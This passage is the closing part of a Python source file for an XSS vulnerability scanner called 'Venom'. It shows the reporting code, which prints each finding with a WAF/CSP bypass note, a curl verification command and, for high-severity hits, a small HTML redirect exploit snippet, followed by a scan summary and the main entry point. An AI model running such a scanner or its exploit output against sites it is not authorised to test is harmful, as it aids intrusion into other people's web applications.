                     f"{RED}║{RESET} {WHITE}WAF/CSP:{RESET} {YELLOW}{self.waf_csp_status}{RESET} | {WHITE}Bypass:{RESET} {YELLOW}{vuln['bypass']}{RESET}\n" \
                     f"{RED}║{RESET} {WHITE}Verify:{RESET} {BLUE}curl -X {vuln['method'].upper()} \"{url}\" {'-d \"' + urlencode(params) + '\"' if vuln['method'] == 'post' else ''} {'-H \"Cookie: ' + '; '.join([f'{k}={v}' for k, v in vuln['cookies'].items()]) + '\"' if vuln['cookies'] else ''}{RESET}\n"
            if popup and "High" in severity:
                output += f"{RED}║{RESET} {WHITE}Exploit:{RESET} {GREEN}<html><body><script>window.location='{url}';</script></body></html>{RESET}\n"
            output += f"{RED}╚════════════════════════════════════════════════════╝{RESET}"
            print(output)
            logging.info(output)

    def report(self) -> None:
        runtime = int(time.time() - self.start_time)
        executed_count = sum(1 for v in self.vulnerabilities if v['executed'])
        summary = f"{BLUE}╔════════════════════════════════════════════════════╗{RESET}\n" \
                  f"{BLUE}║{RESET}         {CYAN}Venom XSS Scan Summary{RESET}                 {BLUE}║{RESET}\n" \
                  f"{BLUE}╚════════════════════════════════════════════════════╝{RESET}\n" \
                  f"{WHITE}Scan Started:{RESET} {GREEN}{time.strftime('%Y-%m-d %H:%M:%S', time.localtime(self.start_time))}{RESET}\n" \
                  f"{WHITE}Scan Ended:{RESET} {GREEN}{time.strftime('%Y-%m-%d %H:%M:%S')}{RESET}\n" \
                  f"{WHITE}Total Runtime:{RESET} {YELLOW}{runtime} seconds{RESET}\n" \
                  f"{WHITE}URLs Scanned:{RESET} {CYAN}{len(self.visited_urls)}{RESET}\n" \
                  f"{WHITE}Tests Performed:{RESET} {CYAN}{self.total_tests.get()}{RESET}\n" \
                  f"{WHITE}Vulnerabilities Found:{RESET} {RED}{len(self.vulnerabilities)}{RESET}\n" \
                  f"{WHITE}Executable Vulns:{RESET} {ORANGE}{executed_count}{RESET}\n" \
                  f"{WHITE}Reflected Only:{RESET} {YELLOW}{len(self.vulnerabilities) - executed_count}{RESET}\n"
        print(summary)
        logging.info(summary)

if __name__ == "__main__":
    try:
        args = parse_args()
        scanner = Venom(args)
        scanner.scan()
    except KeyboardInterrupt:
        logging.info("Scan interrupted")
        if 'scanner' in locals():
            scanner.running = False
            scanner.report()
        sys.exit(0)
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        if 'scanner' in locals():
            scanner.report()
        sys.exit(1)
